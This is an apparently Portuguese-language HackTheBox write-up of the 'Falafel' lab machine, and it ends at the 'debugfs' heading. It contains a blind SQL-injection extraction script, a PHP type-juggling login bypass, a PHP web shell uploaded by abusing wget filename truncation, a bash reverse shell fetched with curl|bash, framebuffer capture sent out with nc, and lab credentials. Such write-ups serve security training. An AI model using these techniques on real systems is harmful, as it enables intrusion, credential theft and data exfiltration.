<!DOCTYPE HTML>
<html lang="pt" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>HTB-Linux-Hard-Falafel - WriteUps HackTheBox - by JavaliMZ</title>
        <!-- Custom HTML head -->
<!-- Content here gets appended to the <html><head> of all the pages -->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script
	async
	src='https://www.googletagmanager.com/gtag/js?id=G-ZCM4NEDCZB'
></script>
<script>
	window.dataLayer = window.dataLayer || []; function
	gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config',
	'G-ZCM4NEDCZB');
</script>
<!-- Custom HTML head: Twitter support -->
<script
	async
	src='https://platform.twitter.com/widgets.js'
	charset='utf-8'
></script>

<meta
	name='google-site-verification'
	content='g05a2qliKESUMKBSl7XG8sosQoaFtDugS6F9MlUbe1Y'
/>        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="theme/css/additional.css">
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item "><a href="Windows.html"><strong aria-hidden="true">1.</strong> Máquinas Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="HTB-Windows-Easy-Omni.html"><strong aria-hidden="true">1.1.</strong> HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="HTB-Windows-Easy-Sauna.html"><strong aria-hidden="true">1.2.</strong> HTB-Windows-Easy-Sauna</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Resolute.html"><strong aria-hidden="true">1.3.</strong> HTB-Windows-Medium-Resolute</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Cascade.html"><strong aria-hidden="true">1.4.</strong> HTB-Windows-Medium-Cascade</a></li><li class="chapter-item "><a href="HTB-Windows-Hard-Blackfield.html"><strong aria-hidden="true">1.5.</strong> HTB-Windows-Hard-Blackfield</a></li><li class="chapter-item "><a href="HTB-Windows-Insane-Bankrobber.html"><strong aria-hidden="true">1.6.</strong> HTB-Windows-Insane-Bankrobber</a></li></ol></li><li class="chapter-item expanded "><a href="Linux.html"><strong aria-hidden="true">2.</strong> Máquinas Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item expanded "><a href="HTB-Linux-Hard-Falafel.html" class="active"><strong aria-hidden="true">2.1.</strong> HTB-Linux-Hard-Falafel</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">WriteUps HackTheBox - by JavaliMZ</h1>

                    <div class="right-buttons">
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p><img src="Assets/HTB-Linux-Hard-Falafel/icon.webp" alt="" /></p>
<img src="https://img.shields.io/badge/Falafel-HackTheBox-red?style=plastic" width="200">
<h1 id="resolução-da-máquina-falafel"><a class="header" href="#resolução-da-máquina-falafel">Resolução da máquina <strong>Falafel</strong></a></h1>
<h4 id="máquina-hard-hacktheboxcom"><a class="header" href="#máquina-hard-hacktheboxcom">Máquina HARD (hackthebox.com)</a></h4>
<h4 id="by-javalimz---09092021"><a class="header" href="#by-javalimz---09092021">by <strong><em>JavaliMZ</em></strong> - 09/09/2021</a></h4>
<hr />
<hr />
<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
<p>Na fase de enumeração, a ferramenta <em>nmap</em> tem um lugar imprescindível!! É possível enumerar portas manualmente, com um simples <em>for loop</em> e um <em>echo para o /dev/tcp/&lt;IP&gt;/&lt;PORT&gt;</em>, mas, para além do nmap ser mais controlável em termo de rendimento, tem também montes de scripts.nse que podem descobrir coisas sobre cada porta aberta.</p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/allPorts.png" alt="allPorts" /></p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/nmap-A.png" alt="nmap-A" /></p>
<p>O resultado do nmap indica-nos que estamos que o nosso alvo é uma máquina Linux, com apenas as portas 22 e 80 abertas. As versões dos serviços correndo nessas portas não parecem ter vulnerabilidades críticas, por isso estamos certos que o ponto de entrada é o servidor WEB</p>
<h2 id="website"><a class="header" href="#website">WebSite</a></h2>
<p><img src="Assets/HTB-Linux-Hard-Falafel/website-1.png" alt="Website - First page" /></p>
<p>Só pela página principal, já obtemos informações potencialmente úteis. Temos um email (IT@falafel.htb) e com isso, podemos suspeitar existir um usuário (IT) e virtual hosting (falafel.htb).</p>
<pre><code class="language-bash"># Adicionar o host ao /etc/hosts
echo -e &quot;10.10.10.73\tfalafel.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<p>Apesar de ser uma suspeita plausível, não existe virtual host.</p>
<h3 id="fuzzing-the-website"><a class="header" href="#fuzzing-the-website">Fuzzing the website</a></h3>
<p>Antes de falar da página do Login (que é por aí que se vai penetrar a máquina!), irei falar sobre as rotas e potenciais ficheiros da máquina.</p>
<pre><code class="language-bash"># Primeira enumeração básica de rotas
ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r

#&gt;  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
#&gt;  css                     [Status: 403, Size: 290, Words: 22, Lines: 12]
#&gt;  js                      [Status: 403, Size: 289, Words: 22, Lines: 12]
#&gt;  uploads                 [Status: 403, Size: 294, Words: 22, Lines: 12]
#&gt;  images                  [Status: 403, Size: 293, Words: 22, Lines: 12]
						#&gt;  [Status: 200, Size: 7203, Words: 774, Lines: 110]
#&gt;  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
</code></pre>
<p>Vemos um diretório <strong>upload</strong>. Mas por enquanto nada de mais... Temos de procurar mais...</p>
<p>O segundo scan que quero rodar é por ficheiros. Sabemos que é um servidor apache com auxilio do nmap, por isso podemos supor que o servidor funcione com ficheiros php. Além disso, o botão de login nós redirige para um login.php. Posto isso, o nosso próximo scan vai ser para procurar ficheiros com extenções php. Podemos também procurar por ficheiros txt...</p>
<pre><code class="language-bash">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php

#&gt;  profile.php             [Status: 200, Size: 7063, Words: 878, Lines: 103]
#&gt;  uploads                 [Status: 403, Size: 294, Words: 22, Lines: 12]
#&gt;  header.php              [Status: 200, Size: 288, Words: 10, Lines: 18]
#&gt;  footer.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
#&gt;  upload.php              [Status: 200, Size: 7063, Words: 878, Lines: 103]
#&gt;  css                     [Status: 403, Size: 290, Words: 22, Lines: 12]
#&gt;  style.php               [Status: 200, Size: 6174, Words: 690, Lines: 69]
#&gt;  index.php               [Status: 200, Size: 7203, Words: 774, Lines: 110]
#&gt;  js                      [Status: 403, Size: 289, Words: 22, Lines: 12]
#&gt;  login.php               [Status: 200, Size: 7063, Words: 878, Lines: 103]
#&gt;  logout.php              [Status: 200, Size: 7063, Words: 878, Lines: 103]
#&gt;  robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2]
#&gt;  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
#&gt;  images                  [Status: 403, Size: 293, Words: 22, Lines: 12]
#&gt;  cyberlaw.txt            [Status: 200, Size: 804, Words: 106, Lines: 18]
#&gt;  connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1]
#&gt;  .php                    [Status: 403, Size: 290, Words: 22, Lines: 12]
#&gt;                          [Status: 200, Size: 7203, Words: 774, Lines: 110]
#&gt;  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]

</code></pre>
<blockquote>
<p>O que é isso de cyberlaw.txt?!</p>
</blockquote>
<p><img src="Assets/HTB-Linux-Hard-Falafel/cyberlaw.png" alt="cyberlaw.txt" /></p>
<p>Bem, isto nos trás algumas informações...</p>
<ul>
<li>Potencial users:
<ul>
<li>devs (de devs@falafel.htb)</li>
<li>lawyers (de lawyers@falafel.htb)</li>
<li>chris (do próprio texto)</li>
<li>admin (da &quot;assinatura&quot;)</li>
</ul>
</li>
</ul>
<p>Ainda nos diz que o usuário chris conseguiu ter FULL CONTROL do site usando um recurso de uploads de imagens, que ainda não descobrimos. Sabemos ainda que o url de upload de imagens está filtrado, por isso não deve ser assim tão fácil... Prossigamos</p>
<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
<p>Quando abrimos a página http://falafel.htb/ de um browser, vemos então um botão login. Ao por credenciais por defeito do tipo <em>admin:admin, admin:password, test:test...</em>, verificamos que poderá existir um usuário admin, pois temo uma mensagem de erro que diz <strong>&quot;Wrong identification : admin&quot;</strong>. Outros usuários aleatórios nos dá a mensagem <strong>&quot;Try again..&quot;</strong>. Agora, e com a tal mensagem de cyberlaw.txt, podemos assumir que o usuário <strong>&quot;admin&quot;</strong> existe.</p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/admin-login-try.png" alt="admin login try" /></p>
<p>Nos servidores em php, é muito commum controlarem o login e outras coisas com uma base de dados MySQL ou similar. Podemos tentar fazer o login com o clássico <strong>&quot;' or 1=1 -- -&quot;</strong> tanto no campo user como no campo password. Obtemos o mesmo erro <strong>&quot;Wrong identification : admin&quot;</strong>. Isto é um claro sinal que este campo é vulnerável a SQLi (SQL injection).</p>
<p>Temos mensagens distintas, mas não temos o erro SQL concreto! Por isso não é bem um blind SQLi, mas também não é assim tão claro.</p>
<p>Ao tentar por <strong>&quot;admin' and sleep(5)&quot;</strong>, temos um erro diferente: <strong>&quot;Hacking Attempt Detected!&quot;</strong>. UHUUU O FBI NOS DETECTOU LOOOL...Bem, isto parece um tipo de filtro a palavar chaves, porque ao escrever apenas e só a palavra <strong>&quot;sleep&quot;</strong> ou <strong>&quot;union&quot;</strong>, optemos o mesmo erro...</p>
<p>Como não vemos nada, mas sabemos como são de uma maneira geral feitas as bases de dados, podemos tentar descobrir o nome da coluna. Ao escrever <strong>admin' and substring(username,1,1)='a'-- -</strong>, estamos a dizer que, para o usuário <em>admin</em>, queremos saber se na coluna de nome <em>username</em>, a letra positionada na 1ª posição é igual a <em>'a'</em>. E isso já nós sabemos. <strong><em>admin</em></strong> começa pela letra <strong><em>'a'</em></strong>.</p>
<pre><code class="language-txt">admin' and substring(username,1,1)='a'-- -
</code></pre>
<p>Obtemos a mesma mensagem de erro (Wrong identification : admin), e se pusermos qualquer outra letra, obtemos outro erro (Try again..) por a primeira letra não corresponder. Isso é muito bom sinal...</p>
<pre><code class="language-txt">admin' and substring(username,2,1)='d'-- -
</code></pre>
<p>Ao testar para o segundo caractere, obtemos o mesmo resultado, apenas optemos (Wrong identification : admin) quando acertamos na letra <strong><em>'d'</em></strong>. Mas porquê &quot;Wrong identification : admin&quot;? A query no código php deve estar a fazer uma comparação, entre admin e admin, e nós adicionamos 'and substring(username,1,1)='a'. Só passa para a verificação seguinte se o &quot;admin&quot; existir, <strong>e se</strong> &quot;a sua primeira letra for 'a'&quot;. Depois de validar o campo user, fica barrado pela password, pois não a temos... Então, quando acerto na substring, vai me responder &quot;Wrong identification&quot;. Posto isso, podemos enumerar todos os campos de todas as tabelas da base de dados desta forma. O único problema é que não temos ideia do nome dessas tabelas nem das suas colunas... Mas também não persisamos saber tudo! Basta-nos a password! Seguindo o mesmo princípio, podemos tentar com o nome de coluna password (por ser comum e normal de ser chamdo assim): <strong>admin' and substring(password,1,1)='0...1...2...3...até...ao...z'-- -</strong>. Manualmente, iria ser possível, mas apenas com 3 litros de café e pausas de 2 em 2 horas! Vamos automatizar isso em python:</p>
<pre><code class="language-python">import requests
import re
from pwn import log


def sendRequest(code):
	url = &quot;http://falafel.htb/login.php&quot;
	header = {&quot;Cookie&quot;: &quot;PHPSESSID=0tpuo9bnh5jo18ibamo44q3ej0&quot;}
	data = {&quot;username&quot;: code, &quot;password&quot;: &quot;password&quot;}

	res = requests.post(url, headers=header, data=data).text
	res = res.replace(&quot;\n&quot;, &quot; &quot;).replace(&quot;\t&quot;, &quot; &quot;)
	regexPattern = r&quot;&lt;br&gt;(.*?)&lt;/br&gt;&quot;
	res = re.findall(regexPattern, res)[0].strip()
	return res


def getPassword(username):
	l1 = log.progress(username)
	password = &quot;&quot;
	chars = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;
	continueSearching = True
	for position in range(1, 100):
		if continueSearching:
			for char in chars:
				code = f&quot;{username}' and substring(password,{position},1)='{char}'-- -&quot;
				if &quot;Wrong identification&quot; in sendRequest(code):
					password += char
					l1.status(password)
					break
				if char == &quot;z&quot;:
					continueSearching = False


def main():
	getPassword(&quot;chris&quot;)
	getPassword(&quot;admin&quot;)


main()
</code></pre>
<p>Este script deu como resultado essas credenciais:</p>
<ul>
<li>chris: d4ee02a22fc872e36d9e3751ba72ddc8</li>
<li>admin: 0e462096931906507119562988736854</li>
</ul>
<p>Credenciais, não... São hashes, e provavelmente poderão ser crackeadas online com uma ferramenta de rambow tables crackstation.net:</p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/Crackstation.png" alt="crack station" /></p>
<blockquote>
<p>Optemos um resultado ==&gt; chris:juggling</p>
</blockquote>
<p><img src="Assets/HTB-Linux-Hard-Falafel/login_chris.png" alt="Login Chris" /></p>
<p>Essas credenciais são válidas para a página de login! E ao entrar, deparamos-nos com a página de apredentação do chris, com um TIPS: <em>TYPE-JUGGLING</em></p>
<p>O hash do usuário &quot;admin&quot; tem uma particularidade. 0e462096931906507119562988736854. Em php, o string &quot;0e462096931906507119562988736854&quot; == 0 ( ou &quot;0&quot; == 0, ou qualquer &quot;0e&lt;numeros...&gt;&quot; == 0) porque php interpreta este 0e&lt;quaiqueres numeros&gt; por <strong>*zero vezes 10 elevado a quaiqueres números</strong> que efectivamente dá zero. Existe ainda em php duas formas de comparar valores.</p>
<ul>
<li>== - loose comparisons (compara apenas valores) (&quot;0&quot; == 0.0000 =&gt; true)</li>
<li>=== - strick comparisons (compara valores, e tipos de valores) (&quot;0&quot; == 0.0000 =&gt; false)</li>
</ul>
<p>Se o código php estiver a fazer uma comparação com apenas 2 iguais <strong>&quot;==&quot;</strong>, poderá aceitar toda e qualquer palavra passe cuja a sua MD5 é 0e&lt;numeros...&gt;</p>
<p>Na internet, podemos encontrar muitas dessas passwords. Irei tentar com &quot;NWWKITQ&quot;</p>
<blockquote>
<p>admin:NWWKITQ (Não é a password real, apenas deu por juggling bypass)</p>
</blockquote>
<p>Login efectuado com sucesso!</p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/login_admin.png" alt="logged as admin" /></p>
<h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
<p>Encontramos o tal painel de upload que chris mencionou. Neste momento, o objectivo é enviar um reverse shell para a máquina vítima, e tentat aceder via URL para o mesmo ser executado. O primeiro passo é descobrir que tipo de ficheiro aceita. A caixa de upload indica ficheiros.png. Vou partilhar um servidor http com uma imagem.png.</p>
<pre><code class="language-bash">sudo python3 -m http.server 80
</code></pre>
<p>Conseguimos realmente enviar uma imagem. E a resposa é muito incomum! A resposta parece-se muito com um commando bash, um cd para uma pasta, e um wget para o nosso ficheiro de imagem. Tentei burlar o site de diversas formas (Dupla extensão, mudar o MIME TYPE, concatenar comando com ponto e virgula, &amp;&amp;, ||... mas nada).</p>
<p>A forma de enviar um ficheiro malicioso é surpreendente! O Linux não aceita nomes de arquivos que tenha mais do que 255 caracteres. E o wget está feito para limitar isso, para garantir que receba os arquivos da internet, mesmo com nomes ridiculamente enormes... Tentei então enviar um arquivo de imagem com exatamente 255 caracteres (251 + .png).</p>
<pre><code class="language-bash"># Copia da imagem para um arquivo com nome de 251 caracteres seguindo um padrão para depois poder saber ao certo qual é o ponto exacto onde o wget corta o nome
cp shell.png $(msf-pattern_create -l 251).png
</code></pre>
<p><img src="Assets/HTB-Linux-Hard-Falafel/output_wget.png" alt="Output wget" /></p>
<p>Pela resposta, sabemso que foi enviado com successo, e que o nome foi alterado, tendo como fim o h7Ah.´</p>
<pre><code class="language-bash">msf-pattern_offset -q h7Ah
#&gt;  [*] Exact match at offset 232
</code></pre>
<p>Este &quot;Exact match at offset 232&quot; é feito para bufferoverflow, que normalmente seria o ponto que ficaria no ESP, sendo que não é bem esse o ponto certo. O ponto certo é 236 caracteres, mas como ainda temos de adicionar 4 caracteres para o &quot;.png&quot;, até que dá jeito este erro lol.</p>
<p>Cração de um ficheiro malicioso:</p>
<pre><code class="language-php">&lt;?php
	echo &quot;\nURL Shell... url?cmd=&lt;command&gt;\n\n&quot;;
	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre>
<p>Resumindo:</p>
<ul>
<li>O ficheiro tem obrigatoriamente que terminar por &quot;.png&quot;</li>
<li>O servidor apache interpreta código php</li>
<li>O wget da página de upload corta os nomes muito grandes a partir do caractere 236.</li>
</ul>
<p>Posto isso, se renomearmos o nosso ficheiro malicioso por um arquivo com (232 carateres + .php + .png), o nome do arquivo irá ser cortado a partir do 236º caracter e ficará assim: (232 chars + .php)</p>
<pre><code class="language-bash">cp shell.php $(msf-pattern_create -l 232).php.png
# Agora que temos o número exato de caracteres, poderíamos ter chamado o ficheiro com 232 &quot;A&quot;... mas na altura não me lembrei e o nome está um pouco agressivo para os olhos!
</code></pre>
<p>Resultado:</p>
<blockquote>
<p>http://10.10.14.17/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png</p>
</blockquote>
<p><img src="Assets/HTB-Linux-Hard-Falafel/good_upload.png" alt="uploaded web shell" /></p>
<p>Note the path of the file and go to the webshell Ok, conseguimos enviar um arquivo, que aparentemente agora está na máquina alvo com a extensão .php. E onde está? Bem, no resultado o comando wget, vemos que antes de fazer o download do arquivo, fez um cd para uma pasta. E sabemos ainda que existe uma rota uploads... Ao juntar tudo, podemos tentar ir para a seguinte url(no meu caso):</p>
<blockquote>
<p>http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami</p>
</blockquote>
<p><img src="Assets/HTB-Linux-Hard-Falafel/whoami_web_shell.png" alt="whoami web shell" /></p>
<p>Temos Execução de código remoto!</p>
<h3 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h3>
<p>A forma mais fácil de ter um reverse shell sem ter muitos problemas com caracteres especiais e assim é partilhar um ficheiro com o código do reverse shell lá dentro, para depois fazer um curl e pipeá-lo com um bash (sim pipeá-lo, neste blog, este verbo existe xD)</p>
<p>Criei então um ficheiro com o nome rev.html contendo o seguinte código:</p>
<pre><code class="language-bash">#!/bin/bash

bash -i &gt;&amp; /dev/tcp/10.10.14.17/443 0&gt;&amp;1
</code></pre>
<p>Partilhe então um servidor http com este ficheiro, para que através do RCE, poder dar um curl ao ficheiro, e pipeá-lo com bash</p>
<pre><code class="language-bash">sudo python3 -m http.server 80  # On one terminal
sudo nc -lvnp 443               # On another one
</code></pre>
<blockquote>
<p>http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=curl%20http://10.10.14.17/rev.html|bash</p>
</blockquote>
<h2 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h2>
<p>Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais em /var/www/html/connection.php</p>
<pre><code class="language-bash">(remote) www-data@falafel:/var/www/html$ cat connection.php
&lt;?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
	  echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
   }
?&gt;
</code></pre>
<p>Estas credenciais server para fazer login ao MySQL, mas se reutilizar-mos as credenciais para fazer login por ssh, vemos que as credenciais são válidas!</p>
<h3 id="group-video"><a class="header" href="#group-video">Group video</a></h3>
<p>Esta máquina é um CaptureTheFlag LOL... O próximo passo é completamente irrealista, mas não deixa de ser interessante. Esta máquina não tem mais vulnerabilidades. Ok, então onde estão as credenciais do usuário &quot;yossi&quot;?! Estão no ecrã...</p>
<p>com o commando &quot;w&quot; podemos ver que o yossi está actualmente logado fisicamente na máquina</p>
<pre><code class="language-bash">w
#&gt;   22:31:32 up 10:23,  2 users,  load average: 0.00, 0.00, 0.00
#&gt;  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
#&gt;  yossi    tty1                      12:08   10:22m  0.06s  0.06s -bash
#&gt;  moshe    pts/1    10.10.14.17      22:06    0.00s  0.06s  0.00s w
</code></pre>
<p>O usuário com o qual estamos neste momento (moshe) está no grupo &quot;video&quot;. Os usuário deste grupo pode ver o que está a ser transmitido para o ecrã. E para tirar uma captura de ecrã sem nenhum recurso adicional, pode-se ir à fonte mesmo. Isto é, capturar o que está em /dev/fb0 com um simples cat. Para ler este arquivo (que vem em formato RAW), temos de saber as dimenções da tela, pois este formato não diz nada sobre dimenções, apenas escreve todos os dados numa linha só e &quot;tá feito&quot;. As dimenções actuais do ecrã estão sempre definidas em /sy/class/graphics/fb0/virtual_size</p>
<pre><code class="language-bash">cat /dev/fb0 &gt; /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
#&gt; 1176,885
</code></pre>
<p>Recupere a captura de ecrã para o kali</p>
<pre><code class="language-bash">nc 10.10.14.17 443 &lt; /tmp/screen.raw  # Target Machine
nc -lvnp 443 &gt; screen.raw             # kali Machine
</code></pre>
<p>Abrir o ficheiro com ajuda do GIMP, definido manualmente que este ficheiro é um ficheiro RAW com 1176,885 de dimenções...</p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/Openning_raw_image.png" alt="opennig image raw format with GIMP" /></p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/select_size_raw_image.png" alt="Select size of raw image" /></p>
<p><img src="Assets/HTB-Linux-Hard-Falafel/yossi_password.png" alt="Password yossi" /></p>
<p>Entre agora por ssh com o usuário yossi e a sua credencial (que de passagem só se vê porque o yossi errou primeiro ao introduzi-la e por &quot;grande sorte&quot; ainda está a vista na tela looooool)</p>
<h3 id="group-disk"><a class="header" href="#group-disk">Group disk</a></h3>
<pre><code class="language-bash">for group in $(groups); do echo -e &quot;\n\n\n[*] Archive with group $group permition:\n&quot;; find / -group $group 2&gt;/dev/null; done
</code></pre>
<p>Este commando permite-nos enumerar todos os ficheiro no qual pertence a cada grupo no qual está o usuário. E assim, vemos que o usuário yossio em que estamos logados, tem permissões através do grupo &quot;disk&quot; de leitura e escritura sobre /dev/sda1 e muito mais...</p>
<p>Este /dev/sda1 é muito simplesmente o disco rígido na qual está instalado o prórpio sistema operativo. Mas não dá para abrir assim...</p>
<pre><code class="language-bash">fdisk -l
#&gt;  Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
#&gt;  Units: sectors of 1 * 512 = 512 bytes
#&gt;  Sector size (logical/physical): 512 bytes / 512 bytes
#&gt;  I/O size (minimum/optimal): 512 bytes / 512 bytes
#&gt;  Disklabel type: dos
#&gt;  Disk identifier: 0x01590ad6
#&gt;
#&gt;  Device     Boot    Start      End  Sectors  Size Id Type
#&gt;  /dev/sda1  *        2048 14680063 14678016    7G 83 Linux
#&gt;  /dev/sda2       14682110 16775167  2093058 1022M  5 Extended
#&gt;  /dev/sda5       14682112 16775167  2093056 1022M 82 Linux swap / Solaris


ll /dev/sda1
#&gt;  brw-rw---- 1 root disk 8, 1 Sep  9 12:08 /dev/sda1
</code></pre>
<h3 id="debugfs"><a class="header" href="#debugfs">debugfs</a></h3>
